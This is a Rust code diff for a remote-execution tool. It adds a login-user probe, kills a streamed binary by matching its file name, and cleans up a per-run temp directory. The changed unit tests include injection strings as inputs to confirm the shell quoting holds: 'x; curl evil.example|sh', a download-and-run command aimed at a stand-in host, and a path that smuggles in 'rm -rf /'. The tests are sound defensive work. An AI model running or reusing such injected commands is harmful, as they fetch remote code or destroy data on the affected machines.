@@ -50,6 +50,9 @@ pub struct Probe {
     pub triple: String,
     /// The login user's `$HOME`, absolute; every later path hangs off it.
     pub home: String,
+    /// The login user's name (`id -un`): an `escalate_user` other than this
+    /// one and root cannot read its cache, so the binary is streamed to it.
+    pub user: String,
 }
 
 /// A running remote process with piped stdio.
@@ -70,8 +73,18 @@ pub struct Proc {
 /// outside. See `run::exec_argv`'s test.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct KillTarget {
-    /// Absolute path of the executable to hunt for.
+    /// Absolute path of the executable to hunt for, or with `by_name` its
+    /// file name.
     pub binary: String,
+    /// Match the executable by file name in any directory. A binary
+    /// streamed to its `escalate_user` runs from that account's home, which
+    /// the orchestrator never learns, or from a per-run temp copy that has
+    /// already deleted itself. The name is `<playbook>-<sha256>`, so it
+    /// still matches only this build.
+    pub by_name: bool,
+    /// The suffix of the per-run temp directory the binary was started
+    /// from (`rustible-<suffix>`), removed after a kill like `run_dir`.
+    pub ephemeral: Option<String>,
     /// Basename of the run's temp directory, under the target's `TMPDIR`.
     pub run_dir: String,
     /// The escalation prefix the binary was launched with. The directory
@@ -251,9 +264,12 @@ impl Transport {
         ))
     }
 
-    /// One shell round trip: the machine's triple and `$HOME`.
+    /// One shell round trip: the machine's triple, `$HOME` and the login
+    /// user's name.
     pub async fn probe(&self) -> Result<Probe> {
-        let (code, out, err) = self.sh("uname -sm && printf '%s\\n' \"$HOME\"").await?;
+        let (code, out, err) = self
+            .sh("uname -sm && printf '%s\\n' \"$HOME\" && id -un")
+            .await?;
         if code != 0 {
             bail!("probe failed with exit {code}: {}", err.trim());
         }
@@ -263,9 +279,11 @@ impl Transport {
         if !home.starts_with('/') {
             bail!("probe returned a $HOME that is not absolute: {home:?}");
         }
+        let user = lines.next().unwrap_or_default().trim().to_string();
         Ok(Probe {
             triple: triple_for(uname)?,
             home,
+            user,
         })
     }
 
@@ -399,6 +417,9 @@ impl Transport {
         // so a run that ended cleanly is unaffected.
         if killed && let Some(t) = &target {
             self.sh(&remove_run_dir_script(t)).await?;
+            if let Some(script) = remove_ephemeral_script(t) {
+                self.sh(&script).await?;
+            }
         }
         Ok(())
     }
@@ -416,11 +437,26 @@ impl Transport {
 /// guard, and `kill` would be refused even if it reached one. Such a run
 /// used to survive this script entirely and die from the ssh session being
 /// torn down, which is luck rather than cancellation.
+///
+/// A streamed binary (`by_name`) is matched by file name: its directory is
+/// the `escalate_user`'s, and a per-run copy shows as `<path> (deleted)`.
+///
+/// `/proc` is Linux's. On a macOS target `readlink` answers nothing, every
+/// candidate is skipped, and the run ends when the ssh session is torn
+/// down, streamed or not.
 fn kill_script(t: &KillTarget) -> String {
     let q = shell_quote(&t.binary);
+    let guard = if t.by_name {
+        format!(
+            "case \"$(readlink /proc/$p/exe 2>/dev/null)\" in */{q}|*/{}) ;; *) continue ;; esac",
+            shell_quote(&format!("{} (deleted)", t.binary))
+        )
+    } else {
+        format!("[ \"$(readlink /proc/$p/exe 2>/dev/null)\" = {q} ] || continue")
+    };
     let inner = format!(
         "for p in $(pgrep -f {q}); do \
-           [ \"$(readlink /proc/$p/exe 2>/dev/null)\" = {q} ] || continue; \
+           {guard}; \
            pkill -KILL -P \"$p\"; kill -KILL \"$p\"; \
          done 2>/dev/null; true"
     );
@@ -467,6 +503,20 @@ fn remove_run_dir_script(t: &KillTarget) -> String {
     }
 }
 
+/// Remove the per-run temp copy a killed binary had no chance to remove,
+/// `None` when it was not started from one. `$TMPDIR` is expanded inside
+/// the escalated shell, as the install script that made the directory
+/// expanded it there.
+fn remove_ephemeral_script(t: &KillTarget) -> Option<String> {
+    let suffix = t.ephemeral.as_ref()?;
+    let rm = "rm -rf -- \"${TMPDIR:-/tmp}/rustible-$1\"";
+    let tail = format!("sh -c {} rustible {}", shell_quote(rm), shell_quote(suffix));
+    Some(match escalation_words(&t.escalate) {
+        None => format!("{tail}; true"),
+        Some(esc) => format!("{esc} {tail}; true"),
+    })
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -477,6 +527,8 @@ mod tests {
             binary: "/home/cadu/.cache/rustible/bin/p-ab".into(),
             run_dir: ".rustible-1a2b".into(),
             escalate: vec![],
+            by_name: false,
+            ephemeral: None,
         };
         let script = remove_run_dir_script(&unescalated);
         // TMPDIR is resolved on the target, by the session that launched
@@ -532,6 +584,8 @@ mod tests {
                 "-u".into(),
                 "x; curl evil.example|sh".into(),
             ],
+            by_name: false,
+            ephemeral: None,
         };
         for script in [kill_script(&evil), remove_run_dir_script(&evil)] {
             // One quoted word, so `sh` passes it to sudo as a username
@@ -556,12 +610,14 @@ mod tests {
             binary: "/home/cadu/.cache/rustible/bin/p-ab".into(),
             run_dir: ".rustible-1a".into(),
             escalate: vec![],
+            by_name: false,
+            ephemeral: None,
         };
         assert!(kill_script(&plain).starts_with("for p in $(pgrep -f "));
 
         let as_root = KillTarget {
             escalate: vec!["sudo".into(), "-n".into()],
-            ..plain
+            ..plain.clone()
         };
         let script = kill_script(&as_root);
         assert!(script.starts_with("'sudo' '-n' sh -c "), "{script}");
@@ -576,6 +632,8 @@ mod tests {
             binary: bin.into(),
             run_dir: ".rustible-1a".into(),
             escalate: vec![],
+            by_name: false,
+            ephemeral: None,
         };
         let script = kill_script(&bare("/home/cadu/.cache/rustible/bin/cadu_slow-ab12"));
         // The path is quoted once for `pgrep` and once for the comparison,
@@ -593,6 +651,62 @@ mod tests {
         let nasty = kill_script(&bare("/tmp/x'; rm -rf /; '"));
         assert!(!nasty.contains("x'; rm"), "{nasty}");
         assert!(nasty.contains("x'\\''; rm"), "{nasty}");
+    }
+
+    /// A binary streamed to its `escalate_user` runs from a directory the
+    /// orchestrator does not know, so it is matched by file name, deleted
+    /// or not, and still only after `/proc/<pid>/exe` has been checked.
+    #[test]
+    fn a_streamed_binary_is_killed_by_name() {
+        let t = KillTarget {
+            binary: "site-ab12".into(),
+            by_name: true,
+            run_dir: ".rustible-1a".into(),
+            escalate: vec![
+                "sudo".into(),
+                "-n".into(),
+                "-H".into(),
+                "-u".into(),
+                "svc".into(),
+            ],
+            ephemeral: None,
+        };
+        let script = kill_script(&t);
+        assert!(
+            script.starts_with("'sudo' '-n' '-H' '-u' 'svc' sh -c "),
+            "{script}"
+        );
+        let inner = kill_script(&KillTarget {
+            escalate: vec![],
+            ..t.clone()
+        });
+        assert!(
+            inner.contains(
+                r#"case "$(readlink /proc/$p/exe 2>/dev/null)" in */'site-ab12'|*/'site-ab12 (deleted)') ;; *) continue ;; esac"#
+            ),
+            "{inner}"
+        );
+        let guard = inner.find("readlink /proc/$p/exe").expect("checks exe");
+        assert!(guard < inner.find("kill -KILL").expect("kills"));
+        assert_eq!(remove_ephemeral_script(&t), None);
+    }
+
+    /// The per-run temp copy is removed as the account that made it, with
+    /// `$TMPDIR` expanded where the install expanded it, and the suffix as
+    /// an argument rather than shell text.
+    #[test]
+    fn a_killed_ephemeral_copy_is_removed_as_its_owner() {
+        let t = KillTarget {
+            binary: "site-ab12".into(),
+            by_name: true,
+            run_dir: ".rustible-1a".into(),
+            escalate: vec!["sudo".into(), "-n".into(), "-u".into(), "svc".into()],
+            ephemeral: Some("feed'x".into()),
+        };
+        assert_eq!(
+            remove_ephemeral_script(&t).unwrap(),
+            r#"'sudo' '-n' '-u' 'svc' sh -c 'rm -rf -- "${TMPDIR:-/tmp}/rustible-$1"' rustible 'feed'\''x'; true"#
+        );
     }
 
     #[test]
@@ -780,6 +894,11 @@ mod tests {
 
         let p = t.probe().await.unwrap();
         assert!(p.home.starts_with('/'));
+        let me = std::process::Command::new("id")
+            .arg("-un")
+            .output()
+            .unwrap();
+        assert_eq!(p.user, String::from_utf8_lossy(&me.stdout).trim());
         if cfg!(target_os = "linux") {
             assert!(p.triple.ends_with("-unknown-linux-musl"));
         } else {
